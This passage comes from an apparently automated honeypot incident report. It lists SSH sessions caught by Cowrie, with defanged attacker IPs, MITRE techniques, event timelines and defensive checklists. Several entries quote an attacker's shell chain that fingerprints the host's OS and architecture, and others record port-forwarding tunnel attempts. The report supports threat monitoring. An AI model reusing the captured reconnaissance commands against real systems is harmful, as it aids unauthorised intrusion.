- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d2e071cd1e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:33 |
| **Last Seen** | 2026-08-21 17:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:33:24` | `cowrie.session.connect` |
| `2026-08-21 17:33:24` | `cowrie.client.version` |
| `2026-08-21 17:33:24` | `cowrie.client.kex` |
| `2026-08-21 17:33:28` | `cowrie.login.success` |
| `2026-08-21 17:33:29` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:33:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:33:30` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-500c59531c41

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:36 |
| **Last Seen** | 2026-08-21 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:36:03` | `cowrie.session.connect` |
| `2026-08-21 17:36:03` | `cowrie.client.version` |
| `2026-08-21 17:36:03` | `cowrie.client.kex` |
| `2026-08-21 17:36:04` | `cowrie.login.success` |
| `2026-08-21 17:36:05` | `cowrie.session.params` |
| `2026-08-21 17:36:05` | `cowrie.command.input` |
| `2026-08-21 17:36:05` | `cowrie.command.input` |
| `2026-08-21 17:36:05` | `cowrie.command.input` |
| `2026-08-21 17:36:05` | `cowrie.command.input` |
| `2026-08-21 17:36:05` | `cowrie.command.input` |
| `2026-08-21 17:36:05` | `cowrie.command.success` |
| `2026-08-21 17:36:05` | `cowrie.command.input` |
| `2026-08-21 17:36:05` | `cowrie.command.input` |
| `2026-08-21 17:36:05` | `cowrie.command.input` |
| `2026-08-21 17:36:05` | `cowrie.command.input` |
| `2026-08-21 17:36:05` | `cowrie.log.closed` |
| `2026-08-21 17:36:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb79252daec

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:38 |
| **Last Seen** | 2026-08-21 17:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:38:49` | `cowrie.session.connect` |
| `2026-08-21 17:38:49` | `cowrie.client.version` |
| `2026-08-21 17:38:49` | `cowrie.client.kex` |
| `2026-08-21 17:38:50` | `cowrie.login.success` |
| `2026-08-21 17:38:51` | `cowrie.session.params` |
| `2026-08-21 17:38:51` | `cowrie.command.input` |
| `2026-08-21 17:38:51` | `cowrie.command.input` |
| `2026-08-21 17:38:51` | `cowrie.command.input` |
| `2026-08-21 17:38:51` | `cowrie.command.input` |
| `2026-08-21 17:38:51` | `cowrie.command.input` |
| `2026-08-21 17:38:51` | `cowrie.command.success` |
| `2026-08-21 17:38:51` | `cowrie.command.input` |
| `2026-08-21 17:38:51` | `cowrie.command.input` |
| `2026-08-21 17:38:51` | `cowrie.command.input` |
| `2026-08-21 17:38:51` | `cowrie.command.input` |
| `2026-08-21 17:38:51` | `cowrie.log.closed` |
| `2026-08-21 17:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad82de4dc084

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:41 |
| **Last Seen** | 2026-08-21 17:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:41:18` | `cowrie.session.connect` |
| `2026-08-21 17:41:18` | `cowrie.client.version` |
| `2026-08-21 17:41:18` | `cowrie.client.kex` |
| `2026-08-21 17:41:20` | `cowrie.login.success` |
| `2026-08-21 17:41:21` | `cowrie.session.params` |
| `2026-08-21 17:41:21` | `cowrie.command.input` |
| `2026-08-21 17:41:21` | `cowrie.command.input` |
| `2026-08-21 17:41:21` | `cowrie.command.input` |
| `2026-08-21 17:41:21` | `cowrie.command.input` |
| `2026-08-21 17:41:21` | `cowrie.command.input` |
| `2026-08-21 17:41:21` | `cowrie.command.success` |
| `2026-08-21 17:41:21` | `cowrie.command.input` |
| `2026-08-21 17:41:21` | `cowrie.command.input` |
| `2026-08-21 17:41:21` | `cowrie.command.input` |
| `2026-08-21 17:41:21` | `cowrie.command.input` |
| `2026-08-21 17:41:21` | `cowrie.log.closed` |
| `2026-08-21 17:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b375ada23b0

| Field | Detail |
|---|---|
| **Source IP** | `103.169.73[.]227` |
| **First Seen** | 2026-08-21 17:41 |
| **Last Seen** | 2026-08-21 17:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:41:53` | `cowrie.session.connect` |
| `2026-08-21 17:41:54` | `cowrie.client.version` |
| `2026-08-21 17:41:54` | `cowrie.client.kex` |
| `2026-08-21 17:41:56` | `cowrie.login.success` |
| `2026-08-21 17:41:57` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:42:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.169.73[.]227` to AbuseIPDB if not already reported
- [ ] Block `103.169.73[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38166eeea859

| Field | Detail |
|---|---|
| **Source IP** | `36.74.222[.]57` |
| **First Seen** | 2026-08-21 17:42 |
| **Last Seen** | 2026-08-21 17:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:42:07` | `cowrie.session.connect` |
| `2026-08-21 17:42:08` | `cowrie.client.version` |
| `2026-08-21 17:42:08` | `cowrie.client.kex` |
| `2026-08-21 17:42:10` | `cowrie.login.success` |
| `2026-08-21 17:42:11` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:42:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.74.222[.]57` to AbuseIPDB if not already reported
- [ ] Block `36.74.222[.]57` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d04d40d92cd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-21 17:42 |
| **Last Seen** | 2026-08-21 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:42:13` | `cowrie.session.connect` |
| `2026-08-21 17:42:13` | `cowrie.client.version` |
| `2026-08-21 17:42:13` | `cowrie.client.kex` |
| `2026-08-21 17:42:13` | `cowrie.login.success` |
| `2026-08-21 17:42:13` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:42:13` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86d025ed4118

| Field | Detail |
|---|---|
| **Source IP** | `195.39.242[.]162` |
| **First Seen** | 2026-08-21 17:43 |
| **Last Seen** | 2026-08-21 17:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:43:39` | `cowrie.session.connect` |
| `2026-08-21 17:43:40` | `cowrie.client.version` |
| `2026-08-21 17:43:40` | `cowrie.client.kex` |
| `2026-08-21 17:43:41` | `cowrie.login.success` |
| `2026-08-21 17:43:41` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.39.242[.]162` to AbuseIPDB if not already reported
- [ ] Block `195.39.242[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c02872286e21

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:43 |
| **Last Seen** | 2026-08-21 17:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:43:41` | `cowrie.session.connect` |
| `2026-08-21 17:43:41` | `cowrie.client.version` |
| `2026-08-21 17:43:41` | `cowrie.client.kex` |
| `2026-08-21 17:43:42` | `cowrie.login.success` |
| `2026-08-21 17:43:44` | `cowrie.session.params` |
| `2026-08-21 17:43:44` | `cowrie.command.input` |
| `2026-08-21 17:43:44` | `cowrie.command.input` |
| `2026-08-21 17:43:44` | `cowrie.command.input` |
| `2026-08-21 17:43:44` | `cowrie.command.input` |
| `2026-08-21 17:43:44` | `cowrie.command.input` |
| `2026-08-21 17:43:44` | `cowrie.command.success` |
| `2026-08-21 17:43:44` | `cowrie.command.input` |
| `2026-08-21 17:43:44` | `cowrie.command.input` |
| `2026-08-21 17:43:44` | `cowrie.command.input` |
| `2026-08-21 17:43:44` | `cowrie.command.input` |
| `2026-08-21 17:43:44` | `cowrie.log.closed` |
| `2026-08-21 17:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9daba3b239d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:44 |
| **Last Seen** | 2026-08-21 17:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:44:38` | `cowrie.session.connect` |
| `2026-08-21 17:44:38` | `cowrie.client.version` |
| `2026-08-21 17:44:38` | `cowrie.client.kex` |
| `2026-08-21 17:44:40` | `cowrie.login.success` |
| `2026-08-21 17:44:42` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:44:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:44:43` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:44:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f67ab693dc6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:44 |
| **Last Seen** | 2026-08-21 17:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:44:43` | `cowrie.session.connect` |
| `2026-08-21 17:44:43` | `cowrie.client.version` |
| `2026-08-21 17:44:44` | `cowrie.client.kex` |
| `2026-08-21 17:44:45` | `cowrie.login.success` |
| `2026-08-21 17:44:45` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:44:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:44:45` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ac58509d69

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:46 |
| **Last Seen** | 2026-08-21 17:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:46:02` | `cowrie.session.connect` |
| `2026-08-21 17:46:02` | `cowrie.client.version` |
| `2026-08-21 17:46:02` | `cowrie.client.kex` |
| `2026-08-21 17:46:03` | `cowrie.login.success` |
| `2026-08-21 17:46:04` | `cowrie.session.params` |
| `2026-08-21 17:46:04` | `cowrie.command.input` |
| `2026-08-21 17:46:04` | `cowrie.command.input` |
| `2026-08-21 17:46:04` | `cowrie.command.input` |
| `2026-08-21 17:46:04` | `cowrie.command.input` |
| `2026-08-21 17:46:04` | `cowrie.command.input` |
| `2026-08-21 17:46:04` | `cowrie.command.success` |
| `2026-08-21 17:46:04` | `cowrie.command.input` |
| `2026-08-21 17:46:04` | `cowrie.command.input` |
| `2026-08-21 17:46:04` | `cowrie.command.input` |
| `2026-08-21 17:46:04` | `cowrie.command.input` |
| `2026-08-21 17:46:05` | `cowrie.log.closed` |
| `2026-08-21 17:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1254b7bfffa1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:48 |
| **Last Seen** | 2026-08-21 17:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:48:20` | `cowrie.session.connect` |
| `2026-08-21 17:48:20` | `cowrie.client.version` |
| `2026-08-21 17:48:20` | `cowrie.client.kex` |
| `2026-08-21 17:48:21` | `cowrie.login.success` |
| `2026-08-21 17:48:22` | `cowrie.session.params` |
| `2026-08-21 17:48:22` | `cowrie.command.input` |
| `2026-08-21 17:48:22` | `cowrie.command.input` |
| `2026-08-21 17:48:22` | `cowrie.command.input` |
| `2026-08-21 17:48:22` | `cowrie.command.input` |
| `2026-08-21 17:48:22` | `cowrie.command.input` |
| `2026-08-21 17:48:22` | `cowrie.command.success` |
| `2026-08-21 17:48:22` | `cowrie.command.input` |
| `2026-08-21 17:48:22` | `cowrie.command.input` |
| `2026-08-21 17:48:22` | `cowrie.command.input` |
| `2026-08-21 17:48:22` | `cowrie.command.input` |
| `2026-08-21 17:48:23` | `cowrie.log.closed` |
| `2026-08-21 17:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b737f6d75165

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]134` |
| **First Seen** | 2026-08-21 17:48 |
| **Last Seen** | 2026-08-21 17:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:48:30` | `cowrie.session.connect` |
| `2026-08-21 17:48:30` | `cowrie.client.version` |
| `2026-08-21 17:48:30` | `cowrie.client.kex` |
| `2026-08-21 17:48:32` | `cowrie.login.success` |
| `2026-08-21 17:48:32` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:48:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]134` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42362d6c60f8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:50 |
| **Last Seen** | 2026-08-21 17:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:50:51` | `cowrie.session.connect` |
| `2026-08-21 17:50:51` | `cowrie.client.version` |
| `2026-08-21 17:50:51` | `cowrie.client.kex` |
| `2026-08-21 17:50:52` | `cowrie.login.success` |
| `2026-08-21 17:50:53` | `cowrie.session.params` |
| `2026-08-21 17:50:53` | `cowrie.command.input` |
| `2026-08-21 17:50:53` | `cowrie.command.input` |
| `2026-08-21 17:50:53` | `cowrie.command.input` |
| `2026-08-21 17:50:53` | `cowrie.command.input` |
| `2026-08-21 17:50:53` | `cowrie.command.input` |
| `2026-08-21 17:50:53` | `cowrie.command.success` |
| `2026-08-21 17:50:53` | `cowrie.command.input` |
| `2026-08-21 17:50:53` | `cowrie.command.input` |
| `2026-08-21 17:50:53` | `cowrie.command.input` |
| `2026-08-21 17:50:53` | `cowrie.command.input` |
| `2026-08-21 17:50:53` | `cowrie.log.closed` |
| `2026-08-21 17:50:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcdd4137f5b1

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]88` |
| **First Seen** | 2026-08-21 17:52 |
| **Last Seen** | 2026-08-21 17:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:52:05` | `cowrie.session.connect` |
| `2026-08-21 17:52:05` | `cowrie.client.version` |
| `2026-08-21 17:52:05` | `cowrie.client.kex` |
| `2026-08-21 17:52:07` | `cowrie.login.success` |
| `2026-08-21 17:52:07` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]88` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7876645a305

| Field | Detail |
|---|---|
| **Source IP** | `65.20.143[.]45` |
| **First Seen** | 2026-08-21 17:52 |
| **Last Seen** | 2026-08-21 17:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:52:18` | `cowrie.session.connect` |
| `2026-08-21 17:52:19` | `cowrie.client.version` |
| `2026-08-21 17:52:19` | `cowrie.client.kex` |
| `2026-08-21 17:52:20` | `cowrie.login.success` |
| `2026-08-21 17:52:20` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:52:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.143[.]45` to AbuseIPDB if not already reported
- [ ] Block `65.20.143[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eb42d423242

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]166` |
| **First Seen** | 2026-08-21 17:52 |
| **Last Seen** | 2026-08-21 17:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
